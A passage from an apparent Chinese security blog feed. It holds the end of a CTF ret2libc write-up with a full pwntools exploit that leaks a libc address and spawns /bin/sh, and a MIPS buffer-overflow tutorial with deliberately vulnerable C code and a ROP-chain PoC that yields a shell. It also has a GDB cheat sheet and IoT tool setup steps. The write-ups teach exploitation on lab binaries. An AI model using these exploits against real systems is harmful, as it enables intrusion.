<code>system</code>函数的地址。 </p><p>那么如何得到<code>libc</code>中的某个函数的地址呢？我们一般常用的方法是采用<code>got</code>表泄露，即输出某个函数对应的<code>got</code>表项的内容。<strong>当然，由于<code>libc</code>的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong> 根据上述方法找到<code>libc</code>之后查询偏移，获取<code>system</code>地址,手动操作有点复杂，而且<code>github</code>有个现成的<a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">利用工具</a></p><p>此外，在得到<code>libc</code>之后，其实<code>libc</code>中也是有 /bin/sh 字符串的，所以我们可以一起获得<code>/bin/sh</code>字符串的地址。 </p><p>这里我们泄露<code>puts</code>的地址。基本利用思路如下:</p><ul><li>泄露<code>puts</code>地址</li><li>获取<code>libc</code>版本</li><li>获取<code>system</code>地址与<code>/bin/sh</code>的地址</li><li>再次执行源程序(<code>puts</code>函数的回调，直接指向漏洞点)</li><li>触发栈溢出执行<code>system(‘/bin/sh’)</code></li></ul><p>整理的<code>EXP</code>如下:</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *from LibcSearcher import LibcSearchersh = process(&#39;./pwn7&#39;)ret2libc3 = ELF(&#39;./pwn7&#39;)puts_plt = ret2libc3.plt[&#39;puts&#39;]puts_got = ret2libc3.got[&#39;puts&#39;]main = ret2libc3.symbols[&#39;main&#39;]print &quot;leak puts_got addr and return to main again&quot;payload = flat([&#39;A&#39; * 112, puts_plt, main, puts_got])sh.sendlineafter(&#39;Can you find it !?&#39;, payload)print &quot;get the related addr&quot;puts_addr = u32(sh.recv()[0:4])libc = LibcSearcher(&#39;puts&#39;, puts_addr)libcbase = puts_addr - libc.dump(&#39;puts&#39;)system_addr = libcbase + libc.dump(&#39;system&#39;)binsh_addr = libcbase + libc.dump(&#39;str_bin_sh&#39;)print &quot;get shell&quot;payload = flat([&#39;A&#39; * 104, system_addr, 0xdeadbeef, binsh_addr])sh.sendline(payload)sh.interactive()</code></pre><h3 id="GET-SHELL"><a href="#GET-SHELL" class="headerlink" title="GET SHELL"></a>GET SHELL</h3><p><img src="http://file.smilehacker.net/1572270342624.png" alt="成功获取shell"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.anquanke.com/post/id/164530" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164530</a></li><li><a href="https://www.anquanke.com/post/id/168468" target="_blank" rel="noopener">https://www.anquanke.com/post/id/168468</a></li><li><a href="https://zhuanlan.zhihu.com/p/25892385" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/25892385</a></li><li><a href="https://sp4n9x.github.io/2018/05/10/一步一步学ROP之Linux_x86篇-蒸米/" target="_blank" rel="noopener">一步一步学ROP之Linux_x86篇-蒸米</a> </li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Linux-Pwn&quot;&gt;&lt;a href=&quot;#Linux-Pwn&quot; class=&quot;headerlink&quot; title=&quot;Linux Pwn&quot;&gt;&lt;/a&gt;Linux Pwn&lt;/h2&gt;&lt;p&gt;之前分析过一些&lt;code&gt;MIPS&lt;/code&gt;平台下的二进制，对&lt;code&gt;Linux&lt;/code&gt;平台下没怎么研究过。在网上看到一篇文章，写一下总结，比较基础。&lt;/p&gt;
&lt;p&gt;不说原理，只说思路跟解题方法&lt;/p&gt;
&lt;h2 id=&quot;一&quot;&gt;&lt;a href=&quot;#一&quot; class=&quot;headerlink&quot; title=&quot;一&quot;&gt;&lt;/a&gt;一&lt;/h2&gt;&lt;p&gt;下载题目:&lt;a href=&quot;https://github.com/smile0304/pwn_execrise/raw/master/pwn_basic_rop/pwn1&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;pwn&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在分析这道题目之前先使用&lt;a href=&quot;https://github.com/slimm609/checksec.sh&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;code&gt;checksec&lt;/code&gt;&lt;/a&gt;查看一下该程序的保护情况:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;checksec pwn1&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="Pwn" scheme="https://blog.pwntools.xyz/categories/Pwn/"/>
    
    
      <category term="Pwn" scheme="https://blog.pwntools.xyz/tags/Pwn/"/>
    
      <category term="CTF" scheme="https://blog.pwntools.xyz/tags/CTF/"/>
    
      <category term="ROP" scheme="https://blog.pwntools.xyz/tags/ROP/"/>
    
  </entry>
  
  <entry>
    <title>使用GDB调试MIPS架构的缓冲区溢出</title>
    <link href="https://blog.pwntools.xyz/2019/10/23/%E4%BD%BF%E7%94%A8GDB%E8%B0%83%E8%AF%95MIPS%E6%9E%B6%E6%9E%84%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    <id>https://blog.pwntools.xyz/2019/10/23/使用GDB调试MIPS架构的缓冲区溢出/</id>
    <published>2019-10-23T12:55:00.000Z</published>
    <updated>2019-10-23T13:03:29.465Z</updated>
    
    <content type="html"><![CDATA[<h4 id="使用GDB调试MIPS架构的缓冲区溢出"><a href="#使用GDB调试MIPS架构的缓冲区溢出" class="headerlink" title="使用GDB调试MIPS架构的缓冲区溢出"></a>使用GDB调试MIPS架构的缓冲区溢出</h4><h4 id="环境介绍和准备工作"><a href="#环境介绍和准备工作" class="headerlink" title="环境介绍和准备工作"></a>环境介绍和准备工作</h4><p>测试的代码都是来自&lt;&lt;解密家用路由器0day挖掘技术&gt;&gt;一书,书上的调试使用的是QEMU + IDA来动态调试,由于最近在学习GDB的调试，所以尝试用QEMU + GDB来调试,权当练手了。</p><p>测试使用的代码(下面代码中存在明显的缓冲区溢出漏洞)：</p><a id="more"></a><pre><code class="c">#include&lt;stdio.h&gt;#include&lt;sys/stat.h&gt;#include&lt;unistd.h&gt;void do_system(int code, char *cmd){    char buf[255];    //sleep(1);    system(cmd);}void main(){    char buf[256] = {0};    char ch;    int count = 0;    unsigned int fileLen = 0;    struct stat fileData;    FILE *fp;    if(0 == stat(&quot;passwd&quot;, &amp;fileData))        fileLen = fileData.st_size;    else        return 1;    if ((fp = fopen(&quot;passwd&quot;, &quot;rb&quot;)) == NULL)    {        printf(&quot;Cannot open file passwd! \n&quot;);        exit(1);    }    ch = fgetc(fp);    while(count &lt;= fileLen){        buf[count++] = ch;        ch = fgetc(fp);    }    buf[--count] = &#39;\x00&#39;;    if (!strcmp(buf, &quot;adminpwd&quot;))    {        do_system(count, &quot;ls -l&quot;);    }    else    {        printf(&quot;you have an invalid password!\n&quot;);    }    fclose(fp);}</code></pre><p>使用mipsls-linux-gcc来编译程序</p><blockquote><p>mipsel-linux-gcc -g crash.c -static -o vuln_system</p></blockquote><ul><li>-g 生成的可执行文件才能用gdb进行源码级调试</li><li>-o 输出文件的名称</li><li>-static 静态编译</li></ul><p>编译完成后可尝试使用<code>qemu-mipsel</code>验证程序正确性<br><img src="http://file.smilehacker.net/info_1.png" alt="环境介绍"></p><p>从上面图片可以看出,编译产生的程序为一个MIPS程序,在Linux下无法直接运行,生成<code>passwd</code>文件(一个正常的输入文件，并没有造成溢出),使用<code>qemu-mipsel</code>模拟程序获得执行结果。</p><h4 id="使用GDB动态调试程序"><a href="#使用GDB动态调试程序" class="headerlink" title="使用GDB动态调试程序"></a>使用<code>GDB</code>动态调试程序</h4><p>启动<code>qemu</code>远程调试</p><blockquote><p>qemu-mipsel -g 1234 vuln_system</p></blockquote><ul><li>-g 指定<code>qemu-mipsel</code>远程调试端口</li></ul><p>设置<code>gdb</code></p><pre><code class="shell">gdb-multiarch ./vuln_system# 打开gdb后进行如下设置pwndbg&gt; set endian little #设置小端序The target is assumed to be little endianpwndbg&gt; set architecture mips #设置为Mips架构The target architecture is assumed to be mipspwndbg&gt; target remote localhost:1234 #设置远程端口</code></pre><p><img src="http://file.smilehacker.net/Gdbset.png" alt="GDB调试设置"></p><p>现在重新生成<code>passwd</code>文件,使用python向文件中写入600个A</p><blockquote><p>python -c “print ‘A’*600 “&gt; passwd</p></blockquote><p>之后重新用gdb加载程序,直接输入<code>r</code>让程序直接运行。</p><p><img src="http://file.smilehacker.net/info2.png" alt="Alt text"></p><p>可以看到程序直接崩溃，并且崩溃后的<code>PC</code>寄存器指向了<code>0x41414141</code>(A的16进制为0x41)</p><h4 id="劫持执行流程"><a href="#劫持执行流程" class="headerlink" title="劫持执行流程"></a>劫持执行流程</h4><p>从上面可以看到,不仅程序崩溃了,而且完全劫持了函数流程,让<code>PC</code>指针指向0x41414141,现在尝试精准定位，究竟淹没多少个自己可以劫持程序的执行流程。</p><h5 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h5><p>通过静态分析发现,如果要使缓冲区溢出,并控制到堆栈中的返回地址saved_ra,需要覆盖的数据大小应该达到0x1A0-0x04即0x19c字节;作者这里运用这个公式的依据是什么呢?让我们回顾一下X86架构下的情形:</p><p>偏移不就是找buf和ra之间的偏移么,ra是存储于栈里面的(有点类似于x86里面的ret指令),buf指向栈里面,只要计算出buf的初始位置和ra之间的偏移,就可以计算出有多少个字节就可以溢出到ra了！</p><h5 id="寻找偏移"><a href="#寻找偏移" class="headerlink" title="寻找偏移"></a>寻找偏移</h5><p><img src="http://file.smilehacker.net/findoffest.png" alt="寻找偏移"></p><pre><code class="Mips">addiu   $sp, -0x1D0            //sp &lt;==sp-0x1D0sw      $ra, 0x1D0+var_4($sp)  //将ra里面的值存放于堆栈里面,其偏移值为                                            0x1D0+var_4sw      $fp, 0x1D0+var_8($sp)  //将fp里面的值存放于堆栈里面,其偏移为0x1D0+var_8move    $fp, $sp                //fp&lt;== spli      $gp, 0x4291A0           //li指令:将一个立即数存放于寄存器里面sw      $gp, 0x1D0+var_1C0($sp) //将gp里面的值存放于堆栈里面,其偏移为                                        0x1D0+var_1C0addiu   $v0, $fp, 0x1D0+var_1A0    //v0用于存放函数函数返回值li      $v1, 0x100        //将立即数0x100传入v1move    $a2, $v1          //MIPS架构中一般使用a0-a3作为函数的前4个参数move    $a1, $zero        //zero寄存器里面永远为0move    $a0, $v0          //a0=v0la      $v0, memset      //复制memset地址至至v0中move    $t9, $v0         //$t0-$t9供汇编程序使用的临时变量bal     memset           //无条件转移,并且将转移指令后面的第二条地址作为返回值存放                                于Ra里面nop</code></pre><p>结合源代码看,可以发现主函数里面调用的第一个函数为<code>memset</code>函数,但是源代码中没有调用这个函数,发现在调用这个函数之前是调用了3个参数的,分别用到<code>a0</code>,<code>a1</code>,和<code>a2</code>这几个寄存器,而函数<code>memset</code>的原型为<code>void* memset(void* s,int ch,unsigned n)</code>，其主要功能为:在内存空间里以s为起始的地方,将开始的n个字节设为指定值;可以发现传给<code>a2</code>的值为<code>v1</code>,而传给<code>$v1</code>的为<code>0x100</code>(0x100实际上就是十进制256),这里在做的事情是内存初始化,通过这个函数将内存里面的<code>256</code>个字节初始化为<code>0</code>,而这里的内存初始地址是通过指令<code>addiu $v0,$fp,0x1D0+var_1A0</code>来确定的,显然,<code>0x1D0+var_1A0</code>就是我们要找的buf的起始偏移，到这里,我们才能确定:需要覆盖的数据大小应该为<code>0x1D0+var_1A0-0x1D0-var_4</code>即<code>0x19c</code>字节;</p><h5 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h5><p>我们将0x19C以后的数据设置成<code>BBBB</code>(0x42424242),如果我们猜测正确,那程序会被劫持到0x424242处</p><blockquote><p>tt@ubuntu:~$ python -c “print ‘A’*0x19c + ‘BBBB’+’CCCC’”&gt;passwd</p></blockquote><p>接下来使用GDB查看main函数的代码，并在main函数结尾处下断点</p><pre><code class="shell">disassemble main # 查看main函数的汇编代码break *main+740 # 在main函数后740行处下断点</code></pre><p><img src="http://file.smilehacker.net/gccbreaks.png" alt="汇编下断点"></p><p>断点下好后输入<code>c</code>,让程序运行到刚刚下的断点处</p><p><img src="http://file.smilehacker.net/return.png" alt="继续运行"></p><p>输入<code>n</code>,让函数运行到756行，如果<code>ra</code>被替换成<code>0x42424242</code>,就说明我们的猜想是正确的。</p><p><img src="http://file.smilehacker.net/validate.png" alt="猜想成功"></p><p>可以看到pc的值已经成功被劫持为<code>0x42424242</code>了</p><h4 id="构造ROP-chain"><a href="#构造ROP-chain" class="headerlink" title="构造ROP chain"></a>构造ROP chain</h4><p>一般漏洞攻击的途径有两种:一是命令执行,另外一种方法是执行shellcode;<br>这里只谈命令执行的方法:<br>在源程序里面有一个函数do_system_0.虽然从代码里面可以看出，do_system_0函数只能执行“ls -l”命令,但是我们可以构造一条ROP链,通过溢出漏洞调用这个函数,使得这个函数能够执行任意命令.想要构造出ROP链,首先构造出do_system_0这个函数的两个参数,将两个参数分别 装入寄存器<br>a0和a1,这里只需要控制寄存器$a1即可,该参数是命令的字符串地址</p><p>使用<code>IDA</code>脚本插件<code>mipsrop.py</code>搜索合适的<code>ROP Chain</code></p><p><img src="http://file.smilehacker.net/ROPfinder.png" alt="寻找合适的rop链"></p><p><img src="http://file.smilehacker.net/ROPchain.png" alt="ROP"></p><p>在缓冲区溢出时,直接让<code>ra</code>的值指向<code>0x00401FA0</code>,<strong>因为<code>ROP技术</code>使用的堆栈都是同一个堆栈</strong>，只要让<code>$sp+0x58+var_40</code>的值为想要执行的命令,并且在<code>$sp+0x58+var_4</code>处的值存放成跳转到<code>do_system_0</code>函数的地址(<code>0x00400678</code>),就可以达到目的。</p><p><img src="http://file.smilehacker.net/RAreturn.png" alt="设置RA的值"></p><p>现在整理一下当前栈帧:<br><img src="http://file.smilehacker.net/stackinfo.png" alt="当前栈帧"></p><h4 id="整理POC"><a href="#整理POC" class="headerlink" title="整理POC"></a>整理POC</h4><pre><code class="python">&quot;&quot;&quot;struct.pack(&quot;&lt;L&quot;,&quot;xxx&quot;)为小端序struct.pack(&quot;&gt;L&quot;,&quot;xxx&quot;)为大端序&quot;&quot;&quot;import structcmd = &quot;sh&quot;                 # command stringcmd += &quot;\x00&quot;*(4 - (len(cmd) % 4))    # align by 4 bytes#shellcodeshellcode = &quot;A&quot;*0x19C             # padding bufshellcode += struct.pack(&quot;&lt;L&quot;,0x00401FA0) shellcode += &quot;A&quot;*24                # padding before commandshellcode += cmd                # command($a1)shellcode += &quot;B&quot;*(0x3C - len(cmd))        # padding shellcode += struct.pack(&quot;&lt;L&quot;,0x00400678) shellcode += &quot;BBBB&quot;                # paddingprint &#39; ok!&#39;#create password fileprint &#39;[+] create password file&#39;,fw = open(&#39;passwd&#39;,&#39;w&#39;)fw.write(shellcode)#&#39;A&#39;*300+&#39;\x00&#39;*10+&#39;BBBB&#39;)fw.close()print &#39; ok!&#39;</code></pre><p>将上述代码保存为<code>poc.py</code>,运行结果如下</p><p><img src="http://file.smilehacker.net/result.png" alt="result"></p><p>成功拿到shell</p><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><ul><li><a href="https://reverseengineering.stackexchange.com/questions/8829/cross-debugging-for-arm-mips-elf-with-qemu-toolchain" target="_blank" rel="noopener">https://reverseengineering.stackexchange.com/questions/8829/cross-debugging-for-arm-mips-elf-with-qemu-toolchain</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;使用GDB调试MIPS架构的缓冲区溢出&quot;&gt;&lt;a href=&quot;#使用GDB调试MIPS架构的缓冲区溢出&quot; class=&quot;headerlink&quot; title=&quot;使用GDB调试MIPS架构的缓冲区溢出&quot;&gt;&lt;/a&gt;使用GDB调试MIPS架构的缓冲区溢出&lt;/h4&gt;&lt;h4 id=&quot;环境介绍和准备工作&quot;&gt;&lt;a href=&quot;#环境介绍和准备工作&quot; class=&quot;headerlink&quot; title=&quot;环境介绍和准备工作&quot;&gt;&lt;/a&gt;环境介绍和准备工作&lt;/h4&gt;&lt;p&gt;测试的代码都是来自&amp;lt;&amp;lt;解密家用路由器0day挖掘技术&amp;gt;&amp;gt;一书,书上的调试使用的是QEMU + IDA来动态调试,由于最近在学习GDB的调试，所以尝试用QEMU + GDB来调试,权当练手了。&lt;/p&gt;
&lt;p&gt;测试使用的代码(下面代码中存在明显的缓冲区溢出漏洞)：&lt;/p&gt;
    
    </summary>
    
    
      <category term="安全" scheme="https://blog.pwntools.xyz/categories/%E5%AE%89%E5%85%A8/"/>
    
      <category term="IoT" scheme="https://blog.pwntools.xyz/categories/%E5%AE%89%E5%85%A8/IoT/"/>
    
    
      <category term="IoT" scheme="https://blog.pwntools.xyz/tags/IoT/"/>
    
      <category term="调试" scheme="https://blog.pwntools.xyz/tags/%E8%B0%83%E8%AF%95/"/>
    
      <category term="Debug" scheme="https://blog.pwntools.xyz/tags/Debug/"/>
    
      <category term="Mips" scheme="https://blog.pwntools.xyz/tags/Mips/"/>
    
      <category term="溢出" scheme="https://blog.pwntools.xyz/tags/%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>GDB调试命令--持续更新</title>
    <link href="https://blog.pwntools.xyz/2019/10/20/GDB%E8%B0%83%E8%AF%95%E5%91%BD%E4%BB%A4-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"/>
    <id>https://blog.pwntools.xyz/2019/10/20/GDB调试命令-持续更新/</id>
    <published>2019-10-20T12:50:20.000Z</published>
    <updated>2019-10-21T08:41:39.845Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GDB调试命令记录-持续更新"><a href="#GDB调试命令记录-持续更新" class="headerlink" title="GDB调试命令记录(持续更新)"></a>GDB调试命令记录(持续更新)</h2><p>记录一些GDB调试的命令,好记性不如烂笔头</p><h2 id="插件安装"><a href="#插件安装" class="headerlink" title="插件安装"></a>插件安装</h2><p>pwndbg</p><pre><code class="shell">git clone https://github.com/pwndbg/pwndbgcd pwndbg./setup.sh</code></pre><p>如果安装了pwndbg,这样可以省调我们很多gdb的命令操作, 运行界面如下</p><a id="more"></a><p><img src="http://file.smilehacker.net/1570720622109.png" alt="pwndbg界面展示"></p><h2 id="启动GDB"><a href="#启动GDB" class="headerlink" title="启动GDB"></a>启动GDB</h2><p>对C/C++程序的调试，需要在编译前就加上-g选项:</p><pre><code class="bash">$g++ -g hello.cpp -o hello</code></pre><p>调试可执行文件:</p><pre><code class="bash">$gdb &lt;program&gt;</code></pre><p>program也就是你的执行文件，一般在当前目录下。</p><p>调试core文件(core是程序非法执行后core dump后产生的文件):</p><pre><code class="bash">$gdb &lt;program&gt; &lt;core dump file&gt;$gdb program core.11127</code></pre><p>调试服务程序:</p><pre><code class="bash">$gdb &lt;program&gt; &lt;PID&gt;$gdb hello 11127</code></pre><p>如果你的程序是一个服务程序，那么你可以指定这个服务程序运行时的进程ID。gdb会自动attach上去，并调试他。program应该在PATH环境变量中搜索得到。</p><h2 id="gdb交互命令"><a href="#gdb交互命令" class="headerlink" title="gdb交互命令"></a>gdb交互命令</h2><p>启动gdb后，进入到交互模式，通过以下命令完成对程序的调试；注意高频使用的命令一般都会有缩写，熟练使用这些缩写命令能提高调试的效率；</p><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><ul><li>run：简记为 r ，其作用是运行程序，当遇到断点后，程序会在断点处停止运行，等待用户输入下一步的命令。</li><li>continue （简写c ）：继续执行，到下一个断点处（或运行结束）</li><li>next：（简写 n），单步跟踪程序，当遇到函数调用时，也不进入此函数体；此命令同 step 的主要区别是，step 遇到用户自定义的函数，将步进到函数中去运行，而 next 则直接调用函数，不会进入到函数体内。</li><li>step （简写s）：单步调试如果有函数调用，则进入函数；与命令n不同，n是不进入调用的函数的</li><li>until：当你厌倦了在一个循环体内单步跟踪时，这个命令可以运行程序直到退出循环体。</li><li>until+行号： 运行至某行，不仅仅用来跳出循环</li><li>finish： 运行程序，直到当前函数完成返回，并打印函数返回时的堆栈地址和返回值及参数值等信息。</li><li>call 函数(参数)：调用程序中可见的函数，并传递“参数”，如：call gdb_test(55)</li><li>quit：简记为 q ，退出gdb</li></ul><h3 id="设置断点"><a href="#设置断点" class="headerlink" title="设置断点"></a>设置断点</h3><ul><li><p>break n （简写b n）:在第n行处设置断点</p><p>（可以带上代码路径和代码名称： b OAGUPDATE.cpp:578）</p></li><li><p>b fn1 if a＞b：条件断点设置</p></li><li><p>break func（break缩写为b）：在函数func()的入口处设置断点，如：break cb_button</p></li><li><p>delete 断点号n：删除第n个断点</p></li><li><p>disable 断点号n：暂停第n个断点</p></li><li><p>enable 断点号n：开启第n个断点</p></li><li><p>clear 行号n：清除第n行的断点</p></li><li><p>info b （info breakpoints） ：显示当前程序的断点设置情况</p></li><li><p>delete breakpoints：清除所有断点：</p></li></ul><h3 id="查看源代码"><a href="#查看源代码" class="headerlink" title="查看源代码"></a>查看源代码</h3><ul><li>list ：简记为 l ，其作用就是列出程序的源代码，默认每次显示10行。</li><li>list 行号：将显示当前文件以“行号”为中心的前后10行代码，如：list 12</li><li>list 函数名：将显示“函数名”所在函数的源代码，如：list main</li><li>list ：不带参数，将接着上一次 list 命令的，输出下边的内容。</li></ul><h3 id="打印表达式"><a href="#打印表达式" class="headerlink" title="打印表达式"></a>打印表达式</h3><ul><li>print 表达式：简记为 p ，其中“表达式”可以是任何当前正在被测试程序的有效表达式，比如当前正在调试C语言的程序，那么“表达式”可以是任何C语言的有效表达式，包括数字，变量甚至是函数调用。</li><li>print a：将显示整数 a 的值</li><li>print ++a：将把 a 中的值加1,并显示出来</li><li>print name：将显示字符串 name 的值</li><li>print gdb_test(22)：将以整数22作为参数调用 gdb_test() 函数</li><li>print gdb_test(a)：将以变量 a 作为参数调用 gdb_test() 函数</li><li>display 表达式：在单步运行时将非常有用，使用display命令设置一个表达式后，它将在每次单步进行指令后，紧接着输出被设置的表达式及值。如： display a</li><li>watch 表达式：设置一个监视点，一旦被监视的“表达式”的值改变，gdb将强行终止正在被调试的程序。如： watch a</li><li>whatis ：查询变量或函数</li><li>info function： 查询函数</li><li>扩展info locals： 显示当前堆栈页的所有变量</li></ul><h3 id="查询运行信息"><a href="#查询运行信息" class="headerlink" title="查询运行信息"></a>查询运行信息</h3><ul><li>where/bt ：当前运行的堆栈列表；</li><li>bt backtrace 显示当前调用堆栈</li><li>up/down 改变堆栈显示的深度</li><li>set args 参数:指定运行时的参数</li><li>show args：查看设置好的参数</li><li>info program： 来查看程序的是否在运行，进程号，被暂停的原因。</li></ul><h3 id="分割窗口"><a href="#分割窗口" class="headerlink" title="分割窗口"></a>分割窗口</h3><ul><li>layout：用于分割窗口，可以一边查看代码，一边测试：</li><li>layout src：显示源代码窗口</li><li>layout asm：显示反汇编窗口</li><li>layout regs：显示源代码/反汇编和CPU寄存器窗口</li><li>layout split：显示源代码和反汇编窗口</li><li>Ctrl + L：刷新窗口</li></ul><h3 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h3><p>交互模式下直接回车的作用是重复上一指令，对于单步调试非常方便；</p><h2 id="补充一些其他操作"><a href="#补充一些其他操作" class="headerlink" title="补充一些其他操作"></a>补充一些其他操作</h2><h3 id="调试汇编代码"><a href="#调试汇编代码" class="headerlink" title="调试汇编代码"></a>调试汇编代码</h3><ul><li>b fun_name : 会跳过栈初始化的过程</li><li>b *func_name : 不会跳过栈初始化的过程</li><li>b *func_name+n: 在func_name函数偏移n行的位置下断点</li></ul><p>例如:</p><p><img src="http://file.smilehacker.net/1570722300144.png" alt="汇编断点调试"></p><h3 id="GDB中使用管道进行调试"><a href="#GDB中使用管道进行调试" class="headerlink" title="GDB中使用管道进行调试"></a>GDB中使用管道进行调试</h3><p>输入的不是参数，而是标准输入(stdin)</p><pre><code class="shell">gdb ./vuln_progrun &lt; filename_with_input</code></pre><h3 id="GDB-查看栈帧多行数据"><a href="#GDB-查看栈帧多行数据" class="headerlink" title="GDB 查看栈帧多行数据"></a>GDB 查看栈帧多行数据</h3><p>可以清楚看到栈帧里面的情况，一目了然，前面搞死人了</p><pre><code class="shell">stack n[要查看具体多少]</code></pre><p><img src="http://file.smilehacker.net/1571206209216.png" alt="查看堆栈"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;GDB调试命令记录-持续更新&quot;&gt;&lt;a href=&quot;#GDB调试命令记录-持续更新&quot; class=&quot;headerlink&quot; title=&quot;GDB调试命令记录(持续更新)&quot;&gt;&lt;/a&gt;GDB调试命令记录(持续更新)&lt;/h2&gt;&lt;p&gt;记录一些GDB调试的命令,好记性不如烂笔头&lt;/p&gt;
&lt;h2 id=&quot;插件安装&quot;&gt;&lt;a href=&quot;#插件安装&quot; class=&quot;headerlink&quot; title=&quot;插件安装&quot;&gt;&lt;/a&gt;插件安装&lt;/h2&gt;&lt;p&gt;pwndbg&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;shell&quot;&gt;git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果安装了pwndbg,这样可以省调我们很多gdb的命令操作, 运行界面如下&lt;/p&gt;
    
    </summary>
    
    
      <category term="安全" scheme="https://blog.pwntools.xyz/categories/%E5%AE%89%E5%85%A8/"/>
    
      <category term="调试" scheme="https://blog.pwntools.xyz/categories/%E5%AE%89%E5%85%A8/%E8%B0%83%E8%AF%95/"/>
    
    
      <category term="安全" scheme="https://blog.pwntools.xyz/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="GDB" scheme="https://blog.pwntools.xyz/tags/GDB/"/>
    
      <category term="调试" scheme="https://blog.pwntools.xyz/tags/%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>IoT测试环境搭建</title>
    <link href="https://blog.pwntools.xyz/2019/10/18/IoT%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>https://blog.pwntools.xyz/2019/10/18/IoT测试环境搭建/</id>
    <published>2019-10-18T14:36:56.000Z</published>
    <updated>2019-10-21T08:41:53.922Z</updated>
    
    <content type="html"><![CDATA[<h2 id="IoT分析环境搭建"><a href="#IoT分析环境搭建" class="headerlink" title="IoT分析环境搭建"></a>IoT分析环境搭建</h2><p>因为之前没有备份的好习惯，好不容易跑起来的虚拟机说没就没，所以写一篇文章，如果以后不小心又搞丢了虚拟机，也可以快速搭建测试环境需要的工具，不需要再次寻找各种资料。</p><h2 id="工具列表"><a href="#工具列表" class="headerlink" title="工具列表:"></a>工具列表:</h2><ul><li>binwalk 固件提取</li><li>qemu 模拟执行</li><li><del>irmadyne 固件模拟工具</del>(这里没有安装)</li><li>buildroot Mips交叉编译环境</li><li>gdb 调试工具(可编译一个<a href="https://blog.csdn.net/zqj6893/article/details/84662579" target="_blank" rel="noopener">mips-linux-gdb</a>)</li><li>IDA</li><li>ghidra</li><li>GDBServer </li></ul><a id="more"></a><h2 id="Binwalk"><a href="#Binwalk" class="headerlink" title="Binwalk"></a>Binwalk</h2><pre><code class="shell">$ sudo apt-get update  $ sudo apt-get install build-essential autoconf git #安装依赖 # https://github.com/devttys0/binwalk/blob/master/INSTALL.md  $ git clone https://github.com/ReFirmLabs/binwalk.git$ cd binwalk  # python2.7 $ sudo python setup.py install # Python3.x$ sudo python3 setup.py install$ sudo ./deps.sh #debian/Ubuntu可使用脚本自动安装依赖</code></pre><h2 id="Qemu"><a href="#Qemu" class="headerlink" title="Qemu"></a>Qemu</h2><p>Qemu 是纯软件实现的虚拟化模拟器，几乎可以模拟任何硬件设备。 QEMU模拟器主要有两种比较常见的运作模式：</p><ul><li>User Mode（使用者模式） User Mode模式下，用户只需要将各种不同平台的处理编译得到的Linux程序放在QEMU虚拟中运行即可，其他的事情全部由QEMU虚拟机来完成，不需要用户自定义内核和虚拟磁盘等文件；</li><li>System Mode（系统模式）。 System Mode模式下，最明显的特点是用户可以为QEMU虚拟机指定运行的内核或者虚拟硬盘等文件，简单来说系统模式下QEMU虚拟机是可根据用户的要求配置的</li></ul><h3 id="使用源码安装Qemu"><a href="#使用源码安装Qemu" class="headerlink" title="使用源码安装Qemu"></a>使用源码安装Qemu</h3><pre><code class="shell">$ git clone git://git.qemu.org/qemu.git$ cd qemu$ git submodule update --recursive$ sudo apt install libglib2.0 libglib2.0-dev$ sudo apt install autoconf automake libtoolcd $ ./configure$ sudo make &amp;&amp; sudo make install</code></pre><p>ubuntu14.04中用源码方式编译安装qemu时,执行configure步骤提示错误：“ERROR: pixman &gt;= 0.21.8 not present.” 安装如下依赖：</p><pre><code class="shell">$ sudo apt-get install libpixman-1-dev</code></pre><h2 id="firmadyne"><a href="#firmadyne" class="headerlink" title="firmadyne"></a>firmadyne</h2><p>github : <a href="https://github.com/firmadyne/firmadyne" target="_blank" rel="noopener">https://github.com/firmadyne/firmadyne</a></p><h2 id="Buildroot"><a href="#Buildroot" class="headerlink" title="Buildroot"></a>Buildroot</h2><p>下载地址 : <a href="https://buildroot.org/downloads/buildroot-2019.02.6.tar.gz" target="_blank" rel="noopener">https://buildroot.org/downloads/buildroot-2019.02.6.tar.gz</a></p><pre><code class="shell">tar zxvf buildroot-2019.02.6.tar.gzcd buildroot-2019.02.6sudo apt-get install libncurses5-dev patchmake cleanmake menuconfig</code></pre><p>需要设置以下三个选项<br><img src="http://file.smilehacker.net/buildroot_set1.png" alt="buildroot安装选项"></p><ul><li>Target options -&gt; Target Architecture 设置为Mips (little endian)</li><li>Target options -&gt; Target Architecture Variant 设置为 MIPS32</li><li>Toolchain -&gt; Kernal Headers 设置成机器Kennal版本</li></ul><p>选择Save保存, 之后开始编译,</p><pre><code class="shell">sudo make</code></pre><p>经过一个小时的编译，在目录下产生一个<code>output</code>的目录。编译产生的工具在<code>output/host/usr/bin</code>目录下</p><h2 id="GDB"><a href="#GDB" class="headerlink" 